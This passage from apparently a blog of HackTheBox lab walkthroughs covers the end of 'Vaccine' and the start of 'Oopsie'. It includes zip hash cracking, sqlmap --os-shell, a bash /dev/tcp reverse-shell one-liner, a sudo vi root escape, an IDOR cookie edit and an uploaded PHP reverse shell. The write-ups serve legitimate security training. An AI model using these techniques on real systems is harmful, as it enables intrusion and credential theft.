class="hljs-built_in">head</span>&gt;  &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;  &lt;title&gt;MegaCorp Login&lt;/title&gt;  &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;https://fonts.googleapis.com/css?family=Open+Sans:400,700&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;&lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;./style.css&quot;</span>&gt;&lt;/head&gt;  &lt;h1 align=center&gt;MegaCorp Login&lt;/h1&gt;</code></pre><h3 id="TCP-21-ftp"><a href="#TCP-21-ftp" class="headerlink" title="TCP 21 (ftp)"></a>TCP 21 (ftp)</h3><p>→ Login anonymously:</p><pre><code class="hljs bash">└─$ ftp 10.129.230.39Connected to 10.129.230.39.220 (vsFTPd 3.0.3)Name (10.129.230.39:kali): anonymous331 Please specify the password.Password: 230 Login successful.</code></pre><p>→ Get the file </p><pre><code class="hljs bash">ftp&gt; <span class="hljs-built_in">ls</span> -la229 Entering Extended Passive Mode (|||10763|)150 Here comes the directory listing.drwxr-xr-x    2 0        0            4096 Apr 13  2021 .drwxr-xr-x    2 0        0            4096 Apr 13  2021 ..-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip226 Directory send OK.ftp&gt; get backup.zip<span class="hljs-built_in">local</span>: backup.zip remote: backup.zip229 Entering Extended Passive Mode (|||10401|)150 Opening BINARY mode data connection <span class="hljs-keyword">for</span> backup.zip (2533 bytes).100% |*****************************************************************************************************************************************************************|  2533      808.11 KiB/s    00:00 ETA226 Transfer complete.2533 bytes received <span class="hljs-keyword">in</span> 00:00 (49.96 KiB/s)</code></pre><p>Besides SSH and HTTP, what other service is hosted on this box? </p><ul><li>FTP</li></ul><p>This service can be configured to allow login with any password for specific username. What is that username? </p><ul><li>anonymous</li></ul><p> What is the name of the file downloaded over this service? </p><ul><li>backup.zip</li></ul><p> What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? </p><ul><li>zip2john</li></ul><p>→ Generate a hash from <code>backup.zip</code> with zip2john:</p><pre><code class="hljs bash">└─$ zip2john backup.zip &gt; protected.hash</code></pre><pre><code class="hljs bash">└─$ <span class="hljs-built_in">cat</span> protected.hash       backup.zip:$pkzip<span class="hljs-variable">$2</span>*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip</code></pre><p>→ Now we crack the hash:</p><pre><code class="hljs bash">└─$ john protected.hash</code></pre><ul><li>output:</li></ul><pre><code class="hljs bash">Proceeding with wordlist:/usr/share/john/password.lst741852963        (backup.zip)</code></pre><p>→ Let’s see the password in a more readable format with —show:</p><pre><code class="hljs bash">└─$ john --show protected.hashbackup.zip:741852963::backup.zip:style.css, index.php:backup.zip1 password <span class="hljs-built_in">hash</span> cracked, 0 left</code></pre><p>→ Unzip the archieve with the password we got : <code>741852963</code></p><pre><code class="hljs bash">└─$ unzip -P 741852963 backup.zip -d extracted_files</code></pre><p>→ Go into the extracted_files:</p><pre><code class="hljs bash">└─$ <span class="hljs-built_in">cd</span> extracted_files                                                                                                                                                                                                               ┌──(kali㉿kali)-[~/Downloads/extracted_files]└─$ <span class="hljs-built_in">ls</span>index.php  style.css</code></pre><p> Interesting.. </p><p>→ Let’s check index.php:</p><pre><code class="hljs bash">└─$ nano index.php</code></pre><ul><li>output:</li></ul><pre><code class="hljs bash"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;</code></pre><p>username: admin</p><p>password: 2cb42f8734ea607eefed3b70af13bbd3</p><p>It seems like the <code>password</code> is cracked let’s head into <a href="http://crackstation.net/">crackstation.net</a> and try to see if we get the password:</p><p><img src="/../vaccine_img/1.png" alt="alt text"></p><p>Password: <code>qwerty789</code></p><p>Check basic sql: </p><p><img src="/../vaccine_img/2.png" alt="alt text"></p><p>We can see that what we type in the search parameter is passed by in the URL, i think this web app is vulnerable to Error Based SQLi so, let’s intercept a request with BurpSuite to see what method we get while searching. (POST or GET)</p><p><img src="/../vaccine_img/3.png" alt="alt text"></p><p>When searching with the search parameter the request is <code>GET</code> </p><p>→ Let’s copy the PHPSESSID and use sqlmap:</p><p><img src="/../vaccine_img/4.png" alt="alt text"></p><p><code>h36ve0ev3rirnii4toagi9vc9v</code></p><h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><ul><li>command:</li></ul><pre><code class="hljs bash">─$ sqlmap -u <span class="hljs-string">&#x27;http://10.129.91.50/dashboard.php?search=abracadabra&#x27;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=h36ve0ev3rirnii4toagi9vc9v&quot;</span> --os-shell</code></pre><p>→output:</p><pre><code class="hljs bash">[02:36:02] [INFO] the back-end DBMS is PostgreSQLweb server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)web application technology: Apache 2.4.41back-end DBMS: PostgreSQL[02:36:02] [INFO] fingerprinting the back-end DBMS operating system[02:36:02] [INFO] the back-end DBMS operating system is Linux[02:36:02] [INFO] testing <span class="hljs-keyword">if</span> current user is DBA[02:36:03] [INFO] retrieved: <span class="hljs-string">&#x27;1&#x27;</span>[02:36:03] [INFO] going to use <span class="hljs-string">&#x27;COPY ... FROM PROGRAM ...&#x27;</span> <span class="hljs-built_in">command</span> execution[02:36:03] [INFO] calling Linux OS shell. To quit <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;x&#x27;</span> or <span class="hljs-string">&#x27;q&#x27;</span> and press ENTERos-shell&gt;</code></pre><p> What option can be passed to sqlmap to try to get command execution via the sql injection? </p><ul><li>–os-shell</li></ul><p>Now we have shell</p><pre><code class="hljs bash">os-shell&gt; <span class="hljs-built_in">id</span>[02:44:12] [INFO] retrieved: <span class="hljs-string">&#x27;uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)&#x27;</span><span class="hljs-built_in">command</span> standard output: <span class="hljs-string">&#x27;uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)&#x27;</span></code></pre><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>→ Start a nc listener on your machine:</p><pre><code class="hljs bash">└─$ sudo nc -lvnp 6666</code></pre><p>→ On your os-shell do this :</p><pre><code class="hljs bash">bash -c “bash -i &gt;&amp; /dev/tcp/&#123;your_ip&#125;/6666 0&gt;&amp;1”</code></pre><ul><li>output:(we got the shell)</li></ul><p><img src="/../vaccine_img/5.png" alt="alt text"></p><p>→ Spawning a &#x2F;bin&#x2F;bash using python:</p><ul><li>command:</li></ul><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;bin/bash&quot;);&#x27;</span></code></pre><p>→ Go into <code>/var/lib/postgresql</code> :</p><pre><code class="hljs bash">postgres@vaccine:/var/lib/postgresql/11$ <span class="hljs-built_in">cd</span> /var/lib/postgresql<span class="hljs-built_in">cd</span> /var/lib/postgresqlpostgres@vaccine:/var/lib/postgresql$ <span class="hljs-built_in">ls</span> -la<span class="hljs-built_in">ls</span> -latotal 24drwxr-xr-x  5 postgres postgres 4096 Oct 11  2021 .drwxr-xr-x 39 root     root     4096 Jul 23  2021 ..drwxr-xr-x  3 postgres postgres 4096 Jul 23  2021 11lrwxrwxrwx  1 root     root        9 Feb  4  2020 .bash_history -&gt; /dev/nulldrwxrwxr-x  3 postgres postgres 4096 Jul 23  2021 .<span class="hljs-built_in">local</span>lrwxrwxrwx  1 root     root        9 Feb  4  2020 .psql_history -&gt; /dev/nulldrwx------  2 postgres postgres 4096 Jul 23  2021 .ssh-r--------  1 postgres postgres   33 Oct 11  2021 user.txt</code></pre><p>Read user.txt</p><pre><code class="hljs bash">postgres@vaccine:/var/lib/postgresql$ <span class="hljs-built_in">cat</span> user.txt<span class="hljs-built_in">cat</span> user.txtec9b13ca4d6229cd5cc1e09980965bf7</code></pre><p>User flag: ec9b13ca4d6229cd5cc1e09980965bf7</p><p>→ Check <code>/var/www/html</code></p><pre><code class="hljs bash">postgres@vaccine:/var/lib/postgresql/11/main$ <span class="hljs-built_in">cd</span> /var/www/html<span class="hljs-built_in">cd</span> /var/www/htmlpostgres@vaccine:/var/www/html$ <span class="hljs-built_in">ls</span> -la<span class="hljs-built_in">ls</span> -latotal 392drwxr-xr-x 2 root root   4096 Jul 23  2021 .drwxr-xr-x 3 root root   4096 Jul 23  2021 ..-rw-rw-r-- 1 root root 362847 Feb  3  2020 bg.png-rw-r--r-- 1 root root   4723 Feb  3  2020 dashboard.css-rw-r--r-- 1 root root     50 Jan 30  2020 dashboard.js-rw-r--r-- 1 root root   2313 Feb  4  2020 dashboard.php-rw-r--r-- 1 root root   2594 Feb  3  2020 index.php-rw-r--r-- 1 root root   1100 Jan 30  2020 license.txt-rw-r--r-- 1 root root   3274 Feb  3  2020 style.csspostgres@vaccine:/var/www/html$ <span class="hljs-built_in">cat</span> dasboard.php | grep password<span class="hljs-built_in">cat</span> dasboard.php | grep password<span class="hljs-built_in">cat</span>: dasboard.php: No such file or directorypostgres@vaccine:/var/www/html$ <span class="hljs-built_in">cat</span> dashboard.php | grep password<span class="hljs-built_in">cat</span> dashboard.php | grep password          <span class="hljs-variable">$conn</span> = pg_connect(<span class="hljs-string">&quot;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&quot;</span>);</code></pre><p>user&#x3D;postgres password&#x3D;P@s5w0rd!</p><p>→ Connnect to ssh usingn this password and username :</p><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads]└─$ ssh postgres@10.129.91.50The authenticity of host <span class="hljs-string">&#x27;10.129.91.50 (10.129.91.50)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><span class="hljs-string">ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.</span><span class="hljs-string">This host key is known by the following other names/addresses:</span><span class="hljs-string">    ~/.ssh/known_hosts:1: [hashed name]</span><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><span class="hljs-string">Warning: Permanently added &#x27;</span>10.129.91.50<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><span class="hljs-string">postgres@10.129.91.50&#x27;</span>s password: Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Fri 24 May 2024 07:07:29 AM UTC  System load:  0.01              Processes:             195  Usage of /:   32.6% of 8.73GB   Users logged <span class="hljs-keyword">in</span>:       0  Memory usage: 19%               IP address <span class="hljs-keyword">for</span> ens160: 10.129.91.50  Swap usage:   0%0 updates can be installed immediately.0 of these updates are security updates.The list of available updates is more than a week old.To check <span class="hljs-keyword">for</span> new updates run: sudo apt updateThe programs included with the Ubuntu system are free software;the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> theindividual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.postgres@vaccine:~$</code></pre><p>→ sudo -l </p><pre><code class="hljs bash">postgres@vaccine:~$ sudo -l[sudo] password <span class="hljs-keyword">for</span> postgres: Matching Defaults entries <span class="hljs-keyword">for</span> postgres on vaccine:    env_keep+=<span class="hljs-string">&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;</span>, env_keep+=<span class="hljs-string">&quot;XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH&quot;</span>, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,    mail_badpassUser postgres may run the following commands on vaccine:    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</code></pre><p>→ Head out to GTFOBins and check for vi</p><p><a href="https://gtfobins.github.io/gtfobins/vi/">https://gtfobins.github.io/gtfobins/vi/</a></p><p><img src="/../vaccine_img/6.png" alt="alt text"></p><pre><code class="hljs bash">vi:<span class="hljs-built_in">set</span> shell=/bin/sh:shell</code></pre><p>→ run this</p><pre><code class="hljs bash">sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</code></pre><p>shift + <code>:</code> set shell&#x3D;&#x2F;bin&#x2F;sh</p><p><img src="/../vaccine_img/7.png" alt="alt text"></p><p>→ <code>return</code> → esc → &#96;shell&#96;&#96; → return </p><p><img src="/../vaccine_img/8.png" alt="alt text"></p><p>→ We got root:</p><p><img src="/../vaccine_img/9.png" alt="alt text"></p><pre><code class="hljs bash"><span class="hljs-comment"># whoami</span>root<span class="hljs-comment"># cd /root</span><span class="hljs-comment"># ls</span>pg_hba.conf  root.txt  snap<span class="hljs-comment"># cat root.txt</span>dd6e058e814260bc70e9bbdef2715849</code></pre><p>Root flag: <code>dd6e058e814260bc70e9bbdef2715849</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oopsie</title>
      <link href="/2024/05/24/Oopsie/"/>
      <url>/2024/05/24/Oopsie/</url>
      
        <content type="html"><![CDATA[<p><img src="/../oopsie_img/c5843e27067b877dfba7a82e4209a279.png" alt="alt text"></p><p>Machine IP: 10.129.247.167</p><h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning:"></a>NMAP Scanning:</h2><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/…/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>/<span class="hljs-type">oopsie</span>]└─<span class="hljs-variable">$</span> sudo nmap <span class="hljs-literal">-p-</span> <span class="hljs-literal">-sS</span> <span class="hljs-literal">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-literal">--open</span> <span class="hljs-literal">-T5</span> <span class="hljs-literal">-vvv</span> <span class="hljs-literal">-Pn</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">247.167</span>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: Host discovery disabled (<span class="hljs-literal">-Pn</span>). All addresses will be marked <span class="hljs-string">&#x27;up&#x27;</span> and scan times may be slower.Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-21</span> <span class="hljs-number">13</span>:<span class="hljs-number">42</span> EDTInitiating Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">13</span>:<span class="hljs-number">42</span>Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">13</span>:<span class="hljs-number">42</span>, <span class="hljs-number">0.02</span>s elapsedDNS resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.02</span>s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><span class="hljs-type">Initiating</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">42</span><span class="hljs-type">Scanning</span> <span class="hljs-number">10.129</span><span class="hljs-type">.247.167</span> [<span class="hljs-number">65535</span> <span class="hljs-type">ports</span>]<span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">80</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.247.167</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">22</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.247.167</span><span class="hljs-type">Completed</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">42</span>, <span class="hljs-number">13.36</span><span class="hljs-type">s</span> <span class="hljs-type">elapsed</span> (<span class="hljs-number">65535</span> <span class="hljs-type">total</span> <span class="hljs-type">ports</span>)<span class="hljs-type">Nmap</span> <span class="hljs-type">scan</span> <span class="hljs-type">report</span> <span class="hljs-type">for</span> <span class="hljs-number">10.129</span><span class="hljs-type">.247.167</span><span class="hljs-type">Host</span> <span class="hljs-type">is</span> <span class="hljs-type">up</span>, <span class="hljs-type">received</span> <span class="hljs-type">user</span>-<span class="hljs-type">set</span> (<span class="hljs-number">0.048</span><span class="hljs-type">s</span> <span class="hljs-type">latency</span>)<span class="hljs-type">.</span><span class="hljs-type">Scanned</span> <span class="hljs-type">at</span> <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">21</span> <span class="hljs-number">13</span>:<span class="hljs-number">42</span>:<span class="hljs-number">27</span> <span class="hljs-type">EDT</span> <span class="hljs-type">for</span> <span class="hljs-number">13</span><span class="hljs-type">s</span><span class="hljs-type">Not</span> <span class="hljs-type">shown</span>: <span class="hljs-number">62472</span> <span class="hljs-type">closed</span> <span class="hljs-type">tcp</span> <span class="hljs-type">ports</span> (<span class="hljs-type">reset</span>), <span class="hljs-number">3061</span> <span class="hljs-type">filtered</span> <span class="hljs-type">tcp</span> <span class="hljs-type">ports</span> (<span class="hljs-type">no</span>-<span class="hljs-type">response</span>)<span class="hljs-type">Some</span> <span class="hljs-type">closed</span> <span class="hljs-type">ports</span> <span class="hljs-type">may</span> <span class="hljs-type">be</span> <span class="hljs-type">reported</span> <span class="hljs-type">as</span> <span class="hljs-type">filtered</span> <span class="hljs-type">due</span> <span class="hljs-type">to</span> --<span class="hljs-type">defeat</span>-<span class="hljs-type">rst</span>-<span class="hljs-type">ratelimit</span><span class="hljs-type">PORT</span>   <span class="hljs-type">STATE</span> <span class="hljs-type">SERVICE</span> <span class="hljs-type">REASON</span><span class="hljs-number">22</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">ssh</span>     <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">63</span><span class="hljs-number">80</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">http</span>    <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">63</span><span class="hljs-type">Read</span> <span class="hljs-type">data</span> <span class="hljs-type">files</span> <span class="hljs-type">from</span>: /<span class="hljs-type">usr</span>/<span class="hljs-type">bin</span>/<span class="hljs-type">..</span>/<span class="hljs-type">share</span>/<span class="hljs-type">nmap</span><span class="hljs-type">Nmap</span> <span class="hljs-type">done</span>: <span class="hljs-number">1</span> <span class="hljs-type">IP</span> <span class="hljs-type">address</span> (<span class="hljs-number">1</span> <span class="hljs-type">host</span> <span class="hljs-type">up</span>) <span class="hljs-type">scanned</span> <span class="hljs-type">in</span> <span class="hljs-number">13.48</span> <span class="hljs-type">seconds</span>           <span class="hljs-type">Raw</span> <span class="hljs-type">packets</span> <span class="hljs-type">sent</span>: <span class="hljs-number">72205</span> (<span class="hljs-number">3.177</span><span class="hljs-type">MB</span>) | <span class="hljs-type">Rcvd</span>: <span class="hljs-number">65658</span> (<span class="hljs-number">2.626</span><span class="hljs-type">MB</span>)</code></pre><p>FULL NMAP Scanning: (scanning the ports we got)</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/…/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>/<span class="hljs-type">oopsie</span>]└─<span class="hljs-variable">$</span> nmap <span class="hljs-literal">-A</span> <span class="hljs-literal">-sC</span> <span class="hljs-literal">-sV</span> <span class="hljs-literal">-p22</span>,<span class="hljs-number">80</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">247.167</span> <span class="hljs-literal">-Pn</span>                                                    ]Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-21</span> <span class="hljs-number">13</span>:<span class="hljs-number">43</span> EDTStats: <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">0</span> up), <span class="hljs-number">0</span> undergoing Script Pre<span class="hljs-literal">-Scan</span>NSE Timing: About <span class="hljs-number">0.00</span>% doneStats: <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">06</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing Service ScanService scan Timing: About <span class="hljs-number">50.00</span>% done; ETC: <span class="hljs-number">13</span>:<span class="hljs-number">43</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">06</span> remaining)Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">247.167</span>Host is up (<span class="hljs-number">0.045</span>s latency).PORT   STATE SERVICE VERSION<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">3</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)| ssh<span class="hljs-literal">-hostkey</span>: |   <span class="hljs-number">2048</span> <span class="hljs-number">61</span>:e4:<span class="hljs-number">3</span>f:d4:<span class="hljs-number">1</span>e:e2:b2:f1:<span class="hljs-number">0</span>d:<span class="hljs-number">3</span>c:ed:<span class="hljs-number">36</span>:<span class="hljs-number">28</span>:<span class="hljs-number">36</span>:<span class="hljs-number">67</span>:c7 (RSA)|   <span class="hljs-number">256</span> <span class="hljs-number">24</span>:<span class="hljs-number">1</span>d:a4:<span class="hljs-number">17</span>:d4:e3:<span class="hljs-number">2</span>a:<span class="hljs-number">9</span>c:<span class="hljs-number">90</span>:<span class="hljs-number">5</span>c:<span class="hljs-number">30</span>:<span class="hljs-number">58</span>:<span class="hljs-number">8</span>f:<span class="hljs-number">60</span>:<span class="hljs-number">77</span>:<span class="hljs-number">8</span>d (ECDSA)|_  <span class="hljs-number">256</span> <span class="hljs-number">78</span>:<span class="hljs-number">03</span>:<span class="hljs-number">0</span>e:b4:a1:af:e5:c2:f9:<span class="hljs-number">8</span>d:<span class="hljs-number">29</span>:<span class="hljs-number">05</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">29</span>:c9:f2 (ED25519)<span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> ((Ubuntu))|_http<span class="hljs-literal">-server-header</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> (Ubuntu)|_http<span class="hljs-literal">-title</span>: WelcomeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">8.61</span> seconds</code></pre><p> With what kind of tool can intercept web traffic? </p><ul><li>proxy</li></ul><p> What is the path to the directory on the webserver that returns a login page? </p><p>Open ZAP → Open FoxyProxy Configuration → Refresh the page → Attack → Spider → </p><p><img src="/../oopsie_img/1.png" alt="alt text"></p><ul><li>&#x2F;cdn-cgi&#x2F;login</li></ul><p>Login as guest </p><p><img src="/../oopsie_img/2.png" alt="alt text"></p><p>If we hit <code>account</code> we can see in the URL that we have a value id set to <code>2</code> let’s try to change it to something like 1:</p><p><img src="/../oopsie_img/3.png" alt="alt text"></p><p>We change it to 1:</p><p>And we got the <code>name</code> admin .. interesting:</p><p><img src="/../oopsie_img/4.png" alt="alt text"></p><p>Check  &#x2F;uploads</p><p><img src="/../oopsie_img/5.png" alt="alt text"></p><p>Let’s intercept this with BurpSuite:</p><p><img src="/../oopsie_img/6.png" alt="alt text"></p><p>Send to repeater and modify user number to: <code>34322</code> (admin’s number) and role&#x3D;<code>admin</code> hit send:</p><p><img src="/../oopsie_img/7.png" alt="alt text"></p><p>Interesting.. now that we know it should work, go in the proxy tab modify the request to the admin’s number and role&#x3D; <code>admin</code> and hit forward:</p><p><img src="/../oopsie_img/8.png" alt="alt text"></p><p><strong>Voilà</strong></p><p><img src="/../oopsie_img/9.png" alt="alt text"></p><p>After we tried to upload something it didnt worked.. let’s try with inspect element</p><p>We changed the values here aswell:</p><p><img src="/../oopsie_img/10.png" alt="alt text"></p><p>We uploaded a php-reverse shell and it succeeded:</p><p><img src="/../oopsie_img/11.png" alt="alt text"></p><p>Of course we already set up our php reverse shell with our machine IP and the port we are going to listen:</p><p>Now we start a netcat on our kali:</p><pre><code class="hljs powershell">nc <span class="hljs-literal">-lvnp</span> <span class="hljs-number">6666</span></code></pre><p>Go into &#x2F;uploads&#x2F;php-reverse-shell.php</p><p><img src="/../oopsie_img/12.png" alt="alt text"></p><p>And we got shell </p><p><img src="/../oopsie_img/13.png" alt="alt text"></p><p>We forgot to answer some questions:</p><p> What is the access ID of the admin user? </p><ul><li>34322</li></ul><p> On uploading a file, what directory does that file appear in on the server? </p><ul><li>&#x2F;uploads</li></ul><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>Spawning &#x2F;bin&#x2F;bash using python:</p><pre><code class="hljs powershell">python3 <span class="hljs-literal">-c</span> <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></code></pre><p><img src="/../oopsie_img/14.png" alt="alt text"></p><p>We find user flag: <code>f2c74ee8db7983851ab2a96a44eb7981</code></p><p>We have a hint on the site that we may find a password in the site code, let’s check the site from our shell:</p><pre><code class="hljs powershell">www<span class="hljs-literal">-data</span>@oopsie:/home/robert<span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> /var/www/html<span class="hljs-built_in">cd</span> /var/www/htmlwww<span class="hljs-literal">-data</span>@oopsie:/var/www/html<span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><span class="hljs-built_in">ls</span>cdn<span class="hljs-literal">-cgi</span>  css  fonts  images  index.php  js  themes  uploadswww<span class="hljs-literal">-data</span>@oopsie:/var/www/html<span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> cdn<span class="hljs-literal">-cgi</span><span class="hljs-built_in">cd</span> cdn<span 